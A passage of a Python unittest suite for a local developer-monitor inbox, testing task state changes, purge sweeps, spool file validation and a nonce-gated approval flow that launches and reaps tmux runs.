        self.assertEqual(MSG.needs_action_count(), 0)
        self.assertEqual(MSG.needs_action_count(deadline), 1)   # it comes back on its own

    def test_unsnooze_returns_it_now(self):
        MSG.snooze_task(self.task)
        self.assertTrue(MSG.unsnooze_task(self.task))
        row = self._state(self.task)
        self.assertEqual((row['task_state'], row['snoozed_until']), ('todo', None))
        self.assertEqual(MSG.needs_action_count(), 1)

    def test_starting_a_snoozed_task_clears_its_deadline(self):
        MSG.snooze_task(self.task)
        self.assertTrue(MSG.start_task(self.task))
        row = self._state(self.task)
        self.assertEqual((row['task_state'], row['snoozed_until']), ('doing', None))

    def test_snooze_refuses_a_task_already_in_flight(self):
        MSG.start_task(self.task)
        self.assertFalse(MSG.snooze_task(self.task))

    def test_not_a_task_leaves_the_card_and_moves_the_count(self):
        self.assertEqual(MSG.needs_action_count(), 1)
        self.assertTrue(MSG.not_task(self.task))
        row = self._state(self.task)
        self.assertEqual((row['needs_action'], row['task_state']), (0, None))
        self.assertEqual(MSG.needs_action_count(), 0)
        self.assertEqual(MSG.counts()['active'], 3)          # the card itself stays
        self.assertFalse(MSG.not_task(self.task))            # not pressable twice
        self.assertIn('not_task', self._audits(self.task))

    def test_a_reopened_card_can_be_started_again(self):
        MSG.complete_task(self.task)
        MSG.reopen_task(self.task)
        self.assertTrue(MSG.start_task(self.task))

    def test_transitions_are_refused_on_an_unknown_card(self):
        for name in self.TASK_ACTIONS:
            with self.subTest(action=name):
                self.assertFalse(getattr(MSG, name)('no-such-card'))


class TestPreviewTopAndCollector(unittest.TestCase):
    """P5: the hub strip's top three (server-filtered, not client-re-derived) and the
    collector status that lets it tell 'nothing to do' from 'the collector died'."""

    def setUp(self):
        fresh_db()

    def test_collector_status_is_none_when_nothing_ever_arrived(self):
        pv = MSG.preview()
        self.assertIsNone(pv['collected_at'])
        self.assertIsNone(pv['collected_age_seconds'])

    def test_collector_status_tracks_the_latest_arrival_of_any_kind(self):
        MSG.ingest(msg(event_id='e1', group_key='g1'))                     # a record, no task
        pv = MSG.preview()
        self.assertIsNotNone(pv['collected_at'])
        self.assertEqual(pv['collected_age_seconds'], 0)

    def test_collector_status_survives_archive_and_dismiss(self):
        # The ingest pipeline being alive is not the same question as what is on screen.
        MSG.ingest(msg(event_id='e1', group_key='g1'))
        cid = MSG._conn().execute('SELECT card_id FROM cards').fetchone()['card_id']
        MSG.mark_read(cid)
        MSG.archive(cid)
        MSG.dismiss(cid)
        pv = MSG.preview()
        self.assertIsNotNone(pv['collected_at'])

    def test_collector_age_grows_with_time_and_a_new_arrival_resets_it(self):
        MSG.ingest(msg(event_id='old', group_key='go'))
        later = MSG.now_utc() + timedelta(hours=6)
        aged = MSG.collector_status(later)
        self.assertEqual(aged['collected_age_seconds'], 6 * 3600)
        MSG.ingest(msg(event_id='new', group_key='gn'))
        fresh = MSG.collector_status(MSG.now_utc())
        self.assertEqual(fresh['collected_age_seconds'], 0)

    def test_top_three_is_needs_me_only_doing_and_records_excluded(self):
        MSG.ingest(msg(event_id='t1', group_key='g1', needs_action=True))
        cid1 = MSG._conn().execute(
            "SELECT card_id FROM cards WHERE group_key='g1'").fetchone()['card_id']
        MSG.ingest(msg(event_id='t2', group_key='g2', needs_action=True))
        cid2 = MSG._conn().execute(
            "SELECT card_id FROM cards WHERE group_key='g2'").fetchone()['card_id']
        with MSG._conn() as conn:
            conn.execute("UPDATE cards SET task_state='doing' WHERE card_id=?", (cid2,))
        MSG.ingest(msg(event_id='rec', group_key='g3', needs_action=False))
        top_ids = [c['card_id'] for c in MSG.preview()['top']]
        self.assertEqual(top_ids, [cid1])                # doing and record both excluded

    def test_top_three_is_capped_at_three_even_when_preview_shows_more(self):
        for i in range(5):
            MSG.ingest(msg(event_id='t%d' % i, group_key='g%d' % i, needs_action=True))
        pv = MSG.preview()
        self.assertEqual(len(pv['messages']), 5)
        self.assertEqual(len(pv['top']), 3)


class TestSweep(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def test_old_run_schema_gets_lifecycle_columns(self):
        fd, path = tempfile.mkstemp(suffix='.db')
        os.close(fd)
        c = sqlite3.connect(path)
        c.execute(
            'CREATE TABLE runs (run_id TEXT PRIMARY KEY, card_id TEXT NOT NULL, '
            'plan_sha256 TEXT NOT NULL, plan_json TEXT NOT NULL, status TEXT NOT NULL, '
            'tmux_target TEXT, exit_code INTEGER, error TEXT, created_at TEXT NOT NULL, '
            'started_at TEXT, ended_at TEXT)')
        c.commit()
        c.close()
        MSG._local = threading.local()
        MSG.init_db(path)
        columns = {row[1] for row in MSG._conn().execute('PRAGMA table_info(runs)').fetchall()}
        self.assertTrue({'keep_requested', 'kept_at', 'reclaimed_at'} <= columns)

    def test_purge_180d(self):
        MSG.ingest(msg(event_id='old', group_key='g'))
        old = MSG.iso(MSG.now_utc() - timedelta(days=200))
        c = MSG._conn()
        c.execute('UPDATE cards SET received_at=?', (old,))
        c.execute('UPDATE occurrences SET received_at=?', (old,))
        c.commit()
        MSG.sweep()
        self.assertEqual(c.execute('SELECT COUNT(*) FROM cards').fetchone()[0], 0)
        self.assertEqual(c.execute('SELECT COUNT(*) FROM occurrences').fetchone()[0], 0)

    def test_purge_also_clears_runs_approvals_deliveries(self):
        # #7: the 180-day purge also clears the new tables (approvals/runs/deliveries)
        tmp = tempfile.mkdtemp()
        cfg = {'cwd_root': os.path.dirname(tmp)}  # tmp is below the root (strict-under)
        p = {'schema_version': 1, 'event_id': 'a1', 'group_key': 'g', 'source': 's',
             'kind': 'action', 'urgency': 'urgent', 'title': 'T',
             'created_at': MSG.iso(MSG.now_utc()),
             'recommended_action': {'cwd': tmp, 'prompt': 'p', 'explain': 'w'}}
        MSG.ingest(p)                                  # urgent → one delivery
        appr = MSG.issue_approval('a1', cfg)           # one approval
        res = MSG.redeem_approval('a1', appr['nonce'], cfg)  # one run
        MSG.run_finish(res['run_id'], 0)               # completion clears card.run_id (it is no longer active)
        c = MSG._conn()
        old = MSG.iso(MSG.now_utc() - timedelta(days=200))
        c.execute('UPDATE cards SET received_at=?', (old,)); c.commit()
        MSG.sweep()
        for t in ('cards', 'approvals', 'runs', 'deliveries', 'occurrences'):
            self.assertEqual(c.execute(f'SELECT COUNT(*) FROM {t}').fetchone()[0], 0, t)

    def test_purge_skips_card_with_active_run(self):
        # #7 regression guard: a card with an active run (run_id) is not deleted after 180 days (prevents tmux orphans)
        tmp = tempfile.mkdtemp()
        cfg = {'cwd_root': os.path.dirname(tmp)}  # tmp is below the root (strict-under)
        p = {'schema_version': 1, 'event_id': 'a1', 'group_key': 'g', 'source': 's',
             'kind': 'action', 'urgency': 'normal', 'title': 'T',
             'created_at': MSG.iso(MSG.now_utc()),
             'recommended_action': {'cwd': tmp, 'prompt': 'p', 'explain': 'w'}}
        MSG.ingest(p)
        appr = MSG.issue_approval('a1', cfg)
        MSG.redeem_approval('a1', appr['nonce'], cfg)   # run active — card.run_id set
        c = MSG._conn()
        c.execute('UPDATE cards SET received_at=?', (MSG.iso(MSG.now_utc() - timedelta(days=200)),))
        c.commit()
        MSG.sweep()
        self.assertEqual(c.execute('SELECT COUNT(*) FROM cards').fetchone()[0], 1)  # not deleted

    def test_purge_skips_card_with_kept_run(self):
        # A kept window may outlive the normal card retention, so its run record must not be
        # purged while the reaper still needs the Keep exemption.
        tmp = tempfile.mkdtemp()
        cfg = {'cwd_root': os.path.dirname(tmp)}
        p = {'schema_version': 1, 'event_id': 'kept', 'group_key': 'kept', 'source': 's',
             'kind': 'action', 'urgency': 'normal', 'title': 'T',
             'created_at': MSG.iso(MSG.now_utc()),
             'recommended_action': {'cwd': tmp, 'prompt': 'p', 'explain': 'w'}}
        MSG.ingest(p)
        appr = MSG.issue_approval('kept', cfg)
        res = MSG.redeem_approval('kept', appr['nonce'], cfg)
        MSG.run_finish(res['run_id'], 0)
        self.assertEqual(MSG.run_keep(res['run_id']), (True, None))
        c = MSG._conn()
        c.execute('UPDATE cards SET received_at=?',
                  (MSG.iso(MSG.now_utc() - timedelta(days=200)),))
        c.commit()
        MSG.sweep()
        self.assertEqual(c.execute('SELECT COUNT(*) FROM cards').fetchone()[0], 1)
        self.assertEqual(c.execute('SELECT COUNT(*) FROM runs').fetchone()[0], 1)

    def test_purge_skips_unreclaimed_terminal_target(self):
        # If the monitor was down when the 24h reaper should have run, retain the target record
        # so a later sweep can still kill the correct generation instead of orphaning the pane.
        tmp = tempfile.mkdtemp()
        cfg = {'cwd_root': os.path.dirname(tmp)}
        p = {'schema_version': 1, 'event_id': 'targeted', 'group_key': 'targeted', 'source': 's',
             'kind': 'action', 'urgency': 'normal', 'title': 'T',
             'created_at': MSG.iso(MSG.now_utc()),
             'recommended_action': {'cwd': tmp, 'prompt': 'p', 'explain': 'w'}}
        MSG.ingest(p)
        appr = MSG.issue_approval('targeted', cfg)
        res = MSG.redeem_approval('targeted', appr['nonce'], cfg)
        MSG.run_mark_running(res['run_id'], 'p1:@1')
        MSG.run_finish(res['run_id'], 0)
        c = MSG._conn()
        c.execute('UPDATE cards SET received_at=? WHERE card_id=?',
                  (MSG.iso(MSG.now_utc() - timedelta(days=200)), 'targeted'))
        c.commit()
        MSG.sweep()
        self.assertIsNotNone(c.execute('SELECT card_id FROM cards WHERE card_id=?',
                                       ('targeted',)).fetchone())
        self.assertIsNotNone(MSG.get_run(res['run_id']))
        self.assertEqual(c.execute('SELECT COUNT(*) FROM runs').fetchone()[0], 1)

    def test_archive_only_excess_and_not_pinned(self):
        c = MSG._conn()
        old_read = MSG.iso(MSG.now_utc() - timedelta(hours=72))
        # 22 cards, all read and idle; one is pinned.
        for i in range(22):
            MSG.ingest(msg(event_id=f'e{i}', group_key=f'g{i}', urgency='normal'))
        c.execute('UPDATE cards SET read_at=?, last_seen=?, received_at=?',
                  (old_read, old_read, old_read))
        c.execute("UPDATE cards SET pinned=1 WHERE card_id='e0'")
        c.commit()
        MSG.sweep()
        active = MSG.counts()['active']
        # 22 active → archive 2 excess cards → 20 remain. The pinned e0 is excluded and remains.
        self.assertEqual(active, 20)
        self.assertEqual(c.execute(
            "SELECT archived_at FROM cards WHERE card_id='e0'").fetchone()['archived_at'], None)


class TestFlood(unittest.TestCase):
    def setUp(self):
        fresh_db()

    def test_flood_synthesizes_urgent_card(self):
        for i in range(MSG.FLOOD_THRESHOLD):
            MSG.ingest(msg(event_id=f'f{i}', group_key='noisy', urgency='normal'))
        flood = MSG._conn().execute(
            "SELECT * FROM cards WHERE group_key LIKE 'pipe:flood:%'").fetchall()
        self.assertEqual(len(flood), 1)
        self.assertEqual(flood[0]['urgency'], 'urgent')
        self.assertEqual(flood[0]['pinned'], 1)

    def test_flood_no_recursion(self):
        # the flood card itself does not trigger another flood
        for i in range(MSG.FLOOD_THRESHOLD + 5):
            MSG.ingest(msg(event_id=f'f{i}', group_key='noisy'))
        flood = MSG._conn().execute(
            "SELECT COUNT(*) FROM cards WHERE group_key LIKE 'pipe:flood:pipe:flood%'"
        ).fetchone()[0]
        self.assertEqual(flood, 0)


class TestSpool(unittest.TestCase):
    def setUp(self):
        fresh_db()
        self.spool = tempfile.mkdtemp()
        devmon_spool.ensure_dirs(self.spool)

    def _drop(self, name, content):
        """Simulate link(2) publication: tmp write → link → tmp unlink."""
        tmp = os.path.join(self.spool, 'tmp', 'x')
        with open(tmp, 'w') as f:
            f.write(content)
        os.link(tmp, os.path.join(self.spool, 'new', name))
        os.remove(tmp)

    def test_normal_ingest(self):
        self._drop('resource-1.json', json.dumps(msg(event_id='resource-1')))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['inserted'], 1)
        self.assertEqual(os.listdir(os.path.join(self.spool, 'new')), [])   # consumed

    def test_symlink_rejected(self):
        target = os.path.join(self.spool, 'tmp', 'secret')
        with open(target, 'w') as f:
            f.write('secret')
        os.symlink(target, os.path.join(self.spool, 'new', 'resource-1.json'))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['bad'], 1)
        self.assertEqual(r['inserted'], 0)

    def test_fifo_rejected(self):
        os.mkfifo(os.path.join(self.spool, 'new', 'resource-1.json'))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['bad'], 1)

    def test_oversize_rejected(self):
        big = msg(event_id='resource-1')
        big['body'] = 'x' * (MSG.MAX_PAYLOAD + 100)
        self._drop('resource-1.json', json.dumps(big))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['bad'], 1)

    def test_filename_mismatch_rejected(self):
        self._drop('wrong-name.json', json.dumps(msg(event_id='resource-1')))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['bad'], 1)

    def test_no_clobber_link(self):
        self._drop('resource-1.json', json.dumps(msg(event_id='resource-1')))
        # a second link with the same name → EEXIST (producer contract: deduplication)
        tmp = os.path.join(self.spool, 'tmp', 'y')
        with open(tmp, 'w') as f:
            f.write('{}')
        with self.assertRaises(FileExistsError):
            os.link(tmp, os.path.join(self.spool, 'new', 'resource-1.json'))
        os.remove(tmp)

    def test_processing_leftover_recovered(self):
        # a processing/ leftover (crash simulation) → scan returns it to new for reprocessing
        self._drop('resource-1.json', json.dumps(msg(event_id='resource-1')))
        os.rename(os.path.join(self.spool, 'new', 'resource-1.json'),
                  os.path.join(self.spool, 'processing', 'resource-1.json'))
        r = devmon_spool.scan_once(self.spool)
        self.assertEqual(r['inserted'], 1)

    def test_hardened_startup_preserves_exact_cross_uid_modes(self):
        for name, mode in (('', 0o710), ('tmp', 0o3770), ('new', 0o3770),
                           ('processing', 0o700), ('bad', 0o700)):
            path = os.path.join(self.spool, name) if name else self.spool
            os.chmod(path, mode)
        with unittest.mock.patch.dict(os.environ,
                                      {'AIRLOCK_DEV_MONITOR_MESSAGES': 'true'}):
            devmon_spool.ensure_dirs(self.spool)
        self.assertEqual(stat.S_IMODE(os.stat(self.spool).st_mode), 0o710)
        self.assertEqual(stat.S_IMODE(os.stat(os.path.join(self.spool, 'tmp')).st_mode),
                         0o3770)

    def test_hardened_startup_rejects_mode_drift(self):
        os.chmod(self.spool, 0o710)
        with unittest.mock.patch.dict(os.environ,
                                      {'AIRLOCK_DEV_MONITOR_MESSAGES': 'true'}):
            with self.assertRaisesRegex(RuntimeError, 'mode mismatch'):
                devmon_spool.ensure_dirs(self.spool)


class TestStateDirectoryModes(unittest.TestCase):
    def test_hardened_db_start_preserves_0710(self):
        with tempfile.TemporaryDirectory() as state:
            os.chmod(state, 0o710)
            MSG._local = threading.local()
            with unittest.mock.patch.dict(os.environ,
                                          {'AIRLOCK_DEV_MONITOR_MESSAGES': 'true'}):
                MSG.init_db(os.path.join(state, 'messages.db'))
            self.assertEqual(stat.S_IMODE(os.stat(state).st_mode), 0o710)

    def test_default_db_start_reapplies_0700(self):
        with tempfile.TemporaryDirectory() as state:
            os.chmod(state, 0o755)
            MSG._local = threading.local()
            with unittest.mock.patch.dict(os.environ, {}, clear=False):
                os.environ.pop('AIRLOCK_DEV_MONITOR_MESSAGES', None)
                MSG.init_db(os.path.join(state, 'messages.db'))
            self.assertEqual(stat.S_IMODE(os.stat(state).st_mode), 0o700)


class TestExec(unittest.TestCase):
    def setUp(self):
        fresh_db()
        self.tmp = tempfile.mkdtemp()
        self.proj = os.path.join(self.tmp, 'proj')      # project below root (=tmp) — strict-under
        os.makedirs(self.proj, exist_ok=True)
        self.cfg = {'cwd_root': self.tmp}

    def _action(self, cwd=None, skill=None, prompt='Clean this up', exec_argv=None, event_id='a1',
                group_key='g', needs_action=None):
        p = {'schema_version': 1, 'event_id': event_id, 'group_key': group_key,
             'source': 'resource', 'kind': 'action', 'urgency': 'normal',
             'title': 'T', 'created_at': MSG.iso(MSG.now_utc()),
             'recommended_action': {'cwd': cwd if cwd is not None else self.proj, 'explain': 'why'}}
        if needs_action is not None:
            p['needs_action'] = needs_action
        if exec_argv is not None:
            p['recommended_action']['exec'] = exec_argv
        elif skill:
            p['recommended_action']['skill'] = skill
        else:
            p['recommended_action']['prompt'] = prompt
        MSG.ingest(p)
        return event_id

    def test_exec_file_plan(self):
        # direct executable — an absolute, existing, executable path can run through plan.exec (without Claude)
        prog = os.path.join(self.proj, 'run.sh')
        with open(prog, 'w') as f:
            f.write('#!/bin/sh\necho hi\n')
        os.chmod(prog, 0o755)
        cid = self._action(exec_argv=[prog, '--flag'])
        res = MSG.issue_approval(cid, self.cfg)
        self.assertTrue(res['ok'])
        self.assertEqual(res['plan']['exec'], [os.path.realpath(prog), '--flag'])
        self.assertNotIn('prompt', res['plan'])
        self.assertNotIn('skill', res['plan'])

    def test_exec_nonexistent_not_executable(self):
        cid = self._action(exec_argv=['/no/such/prog', 'x'])
        res = MSG.issue_approval(cid, self.cfg)
        self.assertFalse(res['ok'])
        self.assertEqual(res['error'], 'not_executable')

    def test_exec_relative_path_rejected(self):
        cid = self._action(exec_argv=['run.sh'])          # not an absolute path
        res = MSG.issue_approval(cid, self.cfg)
        self.assertFalse(res['ok'])

    def test_exec_without_x_bit_rejected(self):
        prog = os.path.join(self.proj, 'nox.sh')
        with open(prog, 'w') as f:
            f.write('#!/bin/sh\n')
        os.chmod(prog, 0o644)                              # not executable
        cid = self._action(exec_argv=[prog])
        res = MSG.issue_approval(cid, self.cfg)
        self.assertFalse(res['ok'])                      # new cards have card_id == event_id

    def test_plan_issues_nonce(self):
        cid = self._action()
        res = MSG.issue_approval(cid, self.cfg)
        self.assertTrue(res['ok'])
        self.assertTrue(res['nonce'])
        self.assertEqual(res['plan']['cwd'], os.path.realpath(self.proj))
        self.assertEqual(res['plan']['prompt'], 'Clean this up')

    def test_canonical_plan_deterministic(self):
        cid = self._action()
        card = MSG._conn().execute('SELECT * FROM cards WHERE card_id=?', (cid,)).fetchone()
        _, sha1 = MSG.canonical_plan(card, self.cfg)
        _, sha2 = MSG.canonical_plan(card, self.cfg)
        self.assertEqual(sha1, sha2)

    def test_execute_redeems_and_creates_run(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertTrue(res['ok'])
        run = MSG.get_run(res['run_id'])
        self.assertEqual(run['status'], 'starting')
        card = MSG._conn().execute('SELECT run_id FROM cards WHERE card_id=?', (cid,)).fetchone()
        self.assertEqual(card['run_id'], res['run_id'])

    def test_nonce_single_use(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_finish(res['run_id'], 0)                 # run completes and clears card.run_id
        # a second redemption of the same nonce → nonce_used (not reusable even after the run completes)
        res2 = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertFalse(res2['ok'])
        self.assertEqual(res2['error'], 'nonce_used')

    def test_bad_nonce_rejected(self):
        cid = self._action()
        MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, 'not-a-real-nonce', self.cfg)
        self.assertEqual(res['error'], 'no_approval')

    def test_plan_stale_on_dismiss(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        MSG.dismiss(cid)                       # card dismissed after approval → not executable
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertEqual(res['error'], 'plan_stale')

    def test_expired_nonce(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        past = MSG.iso(MSG.now_utc() - timedelta(minutes=1))
        c = MSG._conn(); c.execute('UPDATE approvals SET expires_at=?', (past,)); c.commit()
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertEqual(res['error'], 'expired')

    def test_cwd_outside_root_not_executable(self):
        outside = tempfile.mkdtemp()           # outside cwd_root
        cid = self._action(cwd=outside)
        res = MSG.issue_approval(cid, self.cfg)
        self.assertFalse(res['ok'])
        self.assertEqual(res['error'], 'not_executable')

    def test_cwd_missing_not_executable(self):
        cid = self._action(cwd=os.path.join(self.tmp, 'nope'))
        res = MSG.issue_approval(cid, self.cfg)
        self.assertEqual(res['error'], 'not_executable')

    def test_cwd_equals_root_not_executable(self):
        # the root itself (equivalent to $HOME) is rejected — only child projects are allowed
        cid = self._action(cwd=self.tmp)
        res = MSG.issue_approval(cid, self.cfg)
        self.assertFalse(res['ok'])
        self.assertEqual(res['error'], 'not_executable')

    def test_cwd_arbitrary_subdir_executable(self):
        # any directory below root is executable regardless of naming (workspace, b-workspace, etc.)
        sub = os.path.join(self.tmp, 'b-workspace', 'proj2'); os.makedirs(sub)
        cid = self._action(cwd=sub)
        res = MSG.issue_approval(cid, self.cfg)
        self.assertTrue(res['ok'])

    def test_run_active_blocks_second_plan(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        res = MSG.issue_approval(cid, self.cfg)          # running → reject a new plan
        self.assertEqual(res['error'], 'run_active')

    def test_run_finish_clears_card(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], '@3')
        MSG.run_finish(res['run_id'], 0)
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'done')
        card = MSG._conn().execute('SELECT run_id FROM cards WHERE card_id=?', (cid,)).fetchone()
        self.assertIsNone(card['run_id'])

    def test_run_finish_nonzero_failed(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_finish(res['run_id'], 1)
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'failed')

    def test_run_stop(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], '@7')
        changed, target = MSG.run_stop(res['run_id'])
        self.assertTrue(changed)
        self.assertEqual(target, '@7')
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'stopped')

    def _task_state(self, card_id):
        return MSG._conn().execute(
            'SELECT task_state FROM cards WHERE card_id=?', (card_id,)).fetchone()['task_state']

    def test_redeeming_an_approval_puts_the_task_in_flight(self):
        cid = self._action(needs_action=True)
        appr = MSG.issue_approval(cid, self.cfg)
        self.assertEqual(self._task_state(cid), None)
        MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertEqual(self._task_state(cid), 'doing')
        self.assertEqual(MSG.counts()['doing'], 1)
        self.assertEqual(MSG.needs_action_count(), 0)

    def test_a_record_card_is_not_put_in_flight_by_its_own_run(self):
        cid = self._action(needs_action=False)
        appr = MSG.issue_approval(cid, self.cfg)
        MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertIsNone(self._task_state(cid))

    def test_a_finished_run_leaves_the_task_in_doing(self):
        # The run succeeding is not the problem being handled; the person closes it. That gap
        # is the thing this inbox exists to show.
        cid = self._action(needs_action=True)
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_finish(res['run_id'], 0)
        self.assertEqual(self._task_state(cid), 'doing')
        self.assertEqual(MSG.needs_action_count(), 0)
        self.assertTrue(MSG.complete_task(cid))
        self.assertEqual(self._task_state(cid), 'done')

    def test_a_stopped_or_failed_run_puts_the_task_back(self):
        for ending, call in (('stopped', MSG.run_stop),
                             ('failed', lambda rid: MSG.run_fail(rid, 'launch failed'))):
            with self.subTest(ending=ending):
                fresh_db()
                cid = self._action(needs_action=True, event_id='a-' + ending,
                                   group_key='g-' + ending)
                appr = MSG.issue_approval(cid, self.cfg)
                res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
                call(res['run_id'])
                self.assertEqual(self._task_state(cid), 'todo')
                self.assertEqual(MSG.needs_action_count(), 1)

    def test_run_keep_is_persistent_and_idempotent(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertEqual(MSG.run_keep(res['run_id']), (True, None))
        MSG.run_finish(res['run_id'], 0)
        self.assertTrue(MSG.get_run(res['run_id'])['keep'])
        self.assertEqual(MSG.run_keep(res['run_id']), (True, None))
        self.assertEqual(MSG.reclaimable_runs(), [])

    # ---- terminal notification cards (so results are not missed when the modal is closed) ----
    def _result_cards(self):
        return [c for c in MSG.feed('active')['messages']
                if c['card_id'].startswith('devmon.runresult.')]

    def test_run_finish_emits_result_card(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_finish(res['run_id'], 0)
        cards = self._result_cards()
        self.assertEqual(len(cards), 1)
        # The Outcome's "job finished fine" notice, declaring itself one: a finished run is
        # not a task, so the number on the phone does not move when one arrives.
        self.assertIs(cards[0]['needs_action'], False)
        self.assertEqual(MSG.needs_action_count(), 0)
        self.assertIn('✅ Run completed', cards[0]['title'])
        self.assertEqual(cards[0]['kind'], 'info')
        self.assertIn('rc=0', cards[0]['body'])
        self.assertEqual(cards[0]['result_run_id'], res['run_id'])

    def test_run_failed_emits_result_card_with_rc(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_finish(res['run_id'], 2)
        cards = self._result_cards()
        self.assertEqual(len(cards), 1)
        self.assertIn('Run failed', cards[0]['title'])
        self.assertIn('rc=2', cards[0]['body'])

    def test_run_stop_emits_no_card(self):
        # termination caused by the owner just pressing 'Stop' → zero new information to notify.
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], '@9')
        MSG.run_stop(res['run_id'])
        self.assertEqual(self._result_cards(), [])

    def test_run_finish_twice_emits_one_card(self):
        # reprocessing the sentinel (idempotent) — an unchanged termination produces no notification.
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_finish(res['run_id'], 0)
        MSG.run_finish(res['run_id'], 0)
        self.assertEqual(len(self._result_cards()), 1)

    def test_two_runs_emit_two_cards(self):
        # one card per run — coalescing would lose which run finished.
        cid = self._action()
        for _ in range(2):
            appr = MSG.issue_approval(cid, self.cfg)
            res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
            MSG.run_finish(res['run_id'], 0)
        self.assertEqual(len(self._result_cards()), 2)

    def test_mark_running_true_when_starting(self):
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        self.assertTrue(MSG.run_mark_running(res['run_id'], '@1'))

    def test_mark_running_false_after_terminal(self):
        # #4: if stop/reap terminates a run while launching, mark_running is False → caller kills the window
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_stop(res['run_id'])                     # starting→stopped (no target)
        self.assertFalse(MSG.run_mark_running(res['run_id'], '@1'))

    def _future(self):
        return MSG.now_utc() + timedelta(seconds=MSG.REAP_GRACE_S + 30)

    def test_reap_interrupts_dead_window(self):
        # a recorded target window disappeared after grace → interrupted (generation-aware pid:@N format)
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], 'p1:@9')
        MSG.reap_runs(set(), now=self._future())         # no live window + after grace → interrupted
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'interrupted')

    def test_reap_keeps_alive_window(self):
        # correlation uses the generation-aware key (pid:window_id)
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], 'p1:@9')
        MSG.reap_runs({'p1:@9'}, now=self._future())      # target alive → retain
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'running')

    def test_reap_grace_skips_fresh(self):
        # when just launched (age < grace), do not interrupt even if absent from the snapshot (absorbs false interrupts)
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], 'p1:@9')
        MSG.reap_runs(set())                              # now = current time → age ≈ 0 < grace → skip
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'running')

    def test_reap_leaves_targetless_alone(self):
        # #4/#5/#6 root-cause fix: the reaper never touches an unrecorded target (launching/crash orphan).
        # whether grace passes or a same-named window exists or not — preserve starting and the card lock (prevents double execution).
        # It terminates when the sentinel records normal completion.
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)   # starting, target NULL
        MSG.reap_runs({'@42'}, now=self._future())        # untouched even after grace
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'starting')
        self.assertIsNone(MSG.get_run(res['run_id'])['tmux_target'])
        card = MSG._conn().execute('SELECT run_id FROM cards WHERE card_id=?', (cid,)).fetchone()
        self.assertEqual(card['run_id'], res['run_id'])   # card lock retained → prevents double execution
        # a later sentinel termination releases it normally
        MSG.run_finish(res['run_id'], 0)
        self.assertEqual(MSG.get_run(res['run_id'])['status'], 'done')

    def test_reap_ignores_stale_window_collision(self):
        # round 6: even when a same-named window left by a login shell after completion overlaps in name with a future run, correlation by window_id
        # alone prevents misidentifying the new run's normal window. If the new run's target is in the alive set, retain it
        # — regardless of whether another stale window has the same name.
        cid = self._action()
        appr = MSG.issue_approval(cid, self.cfg)
        res = MSG.redeem_approval(cid, appr['nonce'], self.cfg)
        MSG.run_mark_running(res['run_id'], 'p1:@42')     # new run's actual window
        # even if stale window @7 remains with the same name, retain the new run when @42 is alive
